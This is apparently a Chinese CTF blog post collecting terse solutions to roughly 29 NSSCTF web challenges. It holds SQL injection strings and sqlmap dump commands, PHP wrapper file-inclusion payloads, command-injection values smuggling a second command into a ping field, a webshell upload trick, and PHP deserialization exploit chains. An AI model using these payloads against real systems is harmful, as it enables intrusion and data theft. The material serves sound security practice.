class="toc-text">135.[FSCTF 2023]webshell是啥捏</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#136-GKCTF-2020-CheckIN"><span class="toc-number">121.</span> <span class="toc-text">136.[GKCTF 2020]CheckIN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#137-CISCN-2022-%E5%88%9D%E8%B5%9B-ezpop"><span class="toc-number">122.</span> <span class="toc-text">137.[CISCN 2022 初赛]ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#138-NSSRound-7-Team-ec-RCE"><span class="toc-number">123.</span> <span class="toc-text">138.[NSSRound#7 Team]ec_RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#139-GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">124.</span> <span class="toc-text">139.[GXYCTF 2019]禁止套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#140-MoeCTF-2021-Do-you-know-HTTP"><span class="toc-number">125.</span> <span class="toc-text">140.[MoeCTF 2021]Do you know HTTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#141-HNCTF-2022-WEEK3-ssssti"><span class="toc-number">126.</span> <span class="toc-text">141.[HNCTF 2022 WEEK3]ssssti</span></a></li></ol>
        
    </div>
</aside>

</header>

        <div id="content" class="content">
            <div id="wrapper" class="wrapper" style="max-width: 800px">
                <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            NSS刷题记录
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="https://www.ayanagi.fun/2023/12/15/NSS%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-12-15T08:14:00.000Z" itemprop="datePublished">2023-12-15</time>
</a>

            
<div class="article-tag-list">
    <i class="icon-tag vm"></i>
    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
</div>


        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>…</p>
<span id="more"></span>

<h1 id="1-SWPUCTF-2021-新生赛-gift-F12"><a href="#1-SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="1.[SWPUCTF 2021 新生赛]gift_F12"></a>1.[SWPUCTF 2021 新生赛]gift_F12</h1><p>F12</p>
<h1 id="2-SWPUCTF-2021-新生赛-jicao"><a href="#2-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="2.[SWPUCTF 2021 新生赛]jicao"></a>2.[SWPUCTF 2021 新生赛]jicao</h1><p>payload:</p>
<p>GET <code>json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code></p>
<p>POST <code>id=wllmNB</code></p>
<h1 id="3-SWPUCTF-2021-新生赛-easy-md5"><a href="#3-SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="3.[SWPUCTF 2021 新生赛]easy_md5"></a>3.[SWPUCTF 2021 新生赛]easy_md5</h1><p>payload:</p>
<p>GET name[]&#x3D;1</p>
<p>POST password[]&#x3D;2</p>
<h1 id="4-SWPUCTF-2021-新生赛-easy-sql"><a href="#4-SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="4.[SWPUCTF 2021 新生赛]easy_sql"></a>4.[SWPUCTF 2021 新生赛]easy_sql</h1><p>?wllm&#x3D;1</p>
<p>sqlmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch --dbs</span><br><span class="line">...</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch -D db_name --tables</span><br><span class="line">...</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch -D db_name -T table_name --columns</span><br><span class="line">...</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch -D db_name -T table_name -C column_name --dump</span><br></pre></td></tr></table></figure>

<h1 id="5-SWPUCTF-2021-新生赛-include"><a href="#5-SWPUCTF-2021-新生赛-include" class="headerlink" title="5.[SWPUCTF 2021 新生赛]include"></a>5.[SWPUCTF 2021 新生赛]include</h1><p>payload:</p>
<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h1 id="6-SWPUCTF-2021-新生赛-easyrce"><a href="#6-SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="6.[SWPUCTF 2021 新生赛]easyrce"></a>6.[SWPUCTF 2021 新生赛]easyrce</h1><p>paylpad:</p>
<p>?url&#x3D;system(%27cat%20&#x2F;flllllaaaaaaggggggg%27);</p>
<h1 id="7-SWPUCTF-2021-新生赛-caidao"><a href="#7-SWPUCTF-2021-新生赛-caidao" class="headerlink" title="7.[SWPUCTF 2021 新生赛]caidao"></a>7.[SWPUCTF 2021 新生赛]caidao</h1><p>蚁剑直接连</p>
<h1 id="8-第五空间-2021-WebFTP"><a href="#8-第五空间-2021-WebFTP" class="headerlink" title="8.[第五空间 2021]WebFTP"></a>8.[第五空间 2021]WebFTP</h1><p>admin&#x2F;admin888</p>
<p>进入&#x2F;var&#x2F;www&#x2F;html</p>
<p>&#x2F;phoinfo.php</p>
<h1 id="9-SWPUCTF-2021-新生赛-babyrce"><a href="#9-SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="9.[SWPUCTF 2021 新生赛]babyrce"></a>9.[SWPUCTF 2021 新生赛]babyrce</h1><p>cookie:admin&#x3D;1</p>
<p>&#x2F;rasalghul.php?url&#x3D;cat${IFS}&#x2F;flllllaaaaaaggggggg</p>
<h1 id="10-SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#10-SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="10.[SWPUCTF 2021 新生赛]Do_you_know_http"></a>10.[SWPUCTF 2021 新生赛]Do_you_know_http</h1><p>header:XFF&#x2F;Client-IP:127.0.0.1，抓包发，跟随重定向</p>
<h1 id="11-SWPUCTF-2021-新生赛-ez-unserialize"><a href="#11-SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="11.[SWPUCTF 2021 新生赛]ez_unserialize"></a>11.[SWPUCTF 2021 新生赛]ez_unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd=<span class="string">&quot;ctf&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">    <span class="variable">$passwd</span> = <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="12-SWPUCTF-2021-新生赛-easyupload2-0"><a href="#12-SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="12.[SWPUCTF 2021 新生赛]easyupload2.0"></a>12.[SWPUCTF 2021 新生赛]easyupload2.0</h1><p>后缀phtml</p>
<h1 id="13-SWPUCTF-2021-新生赛-easyupload1-0"><a href="#13-SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="13.[SWPUCTF 2021 新生赛]easyupload1.0"></a>13.[SWPUCTF 2021 新生赛]easyupload1.0</h1><p>mine改为image&#x2F;jpeg</p>
<h1 id="14-SWPUCTF-2021-新生赛-no-wakeup"><a href="#14-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="14.[SWPUCTF 2021 新生赛]no_wakeup"></a>14.[SWPUCTF 2021 新生赛]no_wakeup</h1><p>wakeup绕过，只要序列化中成员函数大于实际成员数即可绕过，即在最终序列化串中修改成员数量。</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd=<span class="string">&quot;wllm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HaHaHa</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</span></span><br><span class="line"><span class="comment">//将&quot;HaHaHa&quot;:2改为&quot;HaHaHa&quot;:3</span></span><br></pre></td></tr></table></figure>

<p>传入<code>?p=O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code></p>
<h1 id="15-suctf-2019-EasySQL"><a href="#15-suctf-2019-EasySQL" class="headerlink" title="15.[suctf 2019]EasySQL"></a>15.[suctf 2019]EasySQL</h1><p>payload：*,1</p>
<p>猜测内置查询语句：<code>select $post[&#39;query&#39;]||flag from Flag</code></p>
<p>拼接后：<code>select *,1||flag from Flag</code>即<code>select *,1 from Flag</code></p>
<p>payload2：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，将||的功能从或运算改为字符串拼接</p>
<h1 id="16-ZJCTF-2019-NiZhuanSiWei"><a href="#16-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="16.[ZJCTF 2019]NiZhuanSiWei"></a>16.[ZJCTF 2019]NiZhuanSiWei</h1><p>exp:</p>
<p><code>?text=data://text/plain, welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="17-SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#17-SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="17.[SWPUCTF 2021 新生赛]PseudoProtocols"></a>17.[SWPUCTF 2021 新生赛]PseudoProtocols</h1><p>payload1：<code>?wllm=php://filter/read=convert.base64-encode/resource=hint.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload2：<code>?a=data://text/plain,I want flag</code></p>
<h1 id="18-BJDCTF-2020-easy-md5"><a href="#18-BJDCTF-2020-easy-md5" class="headerlink" title="18.[BJDCTF 2020]easy_md5"></a>18.[BJDCTF 2020]easy_md5</h1><p>抓包查看包头hint:select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
<p>payload1：<code>?password=ffifdyop</code></p>
<p>payload2：<code>?a[]=1&amp;b[]=2</code></p>
<p>payload3：<code>POST传param1[]=1&amp;param2[]=2</code></p>
<h1 id="19-NISACTF-2022-easyssrf"><a href="#19-NISACTF-2022-easyssrf" class="headerlink" title="19.[NISACTF 2022]easyssrf"></a>19.[NISACTF 2022]easyssrf</h1><p>payload1：<code>file://fl4g</code>，访问ha1x1ux1u.php</p>
<p>payload2：<code>?file=/flag</code></p>
<h1 id="20-SWPUCTF-2021-新生赛-easyupload3-0"><a href="#20-SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="20.[SWPUCTF 2021 新生赛]easyupload3.0"></a>20.[SWPUCTF 2021 新生赛]easyupload3.0</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.htaccess</span><br><span class="line">SetHandler application/x-httpd-php </span><br></pre></td></tr></table></figure>

<p>再传图片马就行了</p>
<h1 id="21-SWPUCTF-2021-新生赛-error"><a href="#21-SWPUCTF-2021-新生赛-error" class="headerlink" title="21.[SWPUCTF 2021 新生赛]error"></a>21.[SWPUCTF 2021 新生赛]error</h1><p>sqlmap一把梭</p>
<h1 id="22-SWPUCTF-2021-新生赛-hardrce"><a href="#22-SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="22.[SWPUCTF 2021 新生赛]hardrce"></a>22.[SWPUCTF 2021 新生赛]hardrce</h1><p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+]your function: system</span><br><span class="line">[+]your command: cat /flllllaaaaaaggggggg</span><br><span class="line">[*] (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure>

<h1 id="23-NCTF-2018-签到题"><a href="#23-NCTF-2018-签到题" class="headerlink" title="23.[NCTF 2018]签到题"></a>23.[NCTF 2018]签到题</h1><p>访问&#x2F;index.php 抓包，包头nctf2018栏即是flag</p>
<h1 id="24-SWPUCTF-2021-新生赛-pop"><a href="#24-SWPUCTF-2021-新生赛-pop" class="headerlink" title="24.[SWPUCTF 2021 新生赛]pop"></a>24.[SWPUCTF 2021 新生赛]pop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后需要调用GetFlag()，为此需要w33m中的<code>__toString</code>，令<code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;=GetFlag</code>，w22m中的w00m可控。通过设置w22m的w00m为w44m赋值，为w33m赋值GetFlag，由于w44m成员属性非public，序列化串会有特殊字符，需要进行urlencode。exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m = <span class="string">&quot;GetFlag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22GetFlag%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<h1 id="25-LitCTF-2023-导弹迷踪"><a href="#25-LitCTF-2023-导弹迷踪" class="headerlink" title="25.[LitCTF 2023]导弹迷踪"></a>25.[LitCTF 2023]导弹迷踪</h1><p>F12</p>
<h1 id="26-SWPUCTF-2021-新生赛-sql"><a href="#26-SWPUCTF-2021-新生赛-sql" class="headerlink" title="26.[SWPUCTF 2021 新生赛]sql"></a>26.[SWPUCTF 2021 新生赛]sql</h1><p>绕过空格使用<code>/**/</code></p>
<p>绕过等号使用<code>like</code></p>
<p>payload1：</p>
<p><code>-1&#39;/**/order/**/by/**/3%23</code></p>
<p>payload2：</p>
<p><code>-1&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23</code></p>
<p>payload3：</p>
<p><code>-1&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like(&#39;LTLT_flag&#39;)%23</code></p>
<p>payload4：</p>
<p><code>-1&#39;/**/union/**/select/**/1,mid(group_concat(id,flag),1,20),3/**/from/**/LTLT_flag%23</code></p>
<p>payload5：</p>
<p><code>-1&#39;/**/union/**/select/**/1,mid(group_concat(id,flag),21,40),3/**/from/**/LTLT_flag%23</code></p>
<p>payload6:</p>
<p><code>-1&#39;/**/union/**/select/**/1,mid(group_concat(id,flag),41,60),3/**/from/**/LTLT_flag%23</code></p>
<h1 id="27-GXYCTF-2019-Ping-Ping-Ping"><a href="#27-GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="27.[GXYCTF 2019]Ping Ping Ping"></a>27.[GXYCTF 2019]Ping Ping Ping</h1><p>payload：</p>
<p><code>127.0.0.1;$a=lg;$b=fl;cat$IFS$9$b$a.php</code></p>
<h1 id="28-NSSCTF-2022-Spring-Recruit-ezgame"><a href="#28-NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="28.[NSSCTF 2022 Spring Recruit]ezgame"></a>28.[NSSCTF 2022 Spring Recruit]ezgame</h1><p>F12</p>
<h1 id="29-LitCTF-2023-我Flag呢？"><a href="#29-LitCTF-2023-我Flag呢？" class="headerlink" title="29.[LitCTF 2023]我Flag呢？"></a>29.[LitCTF 2023]我Flag呢？</h1><p>F12</p>
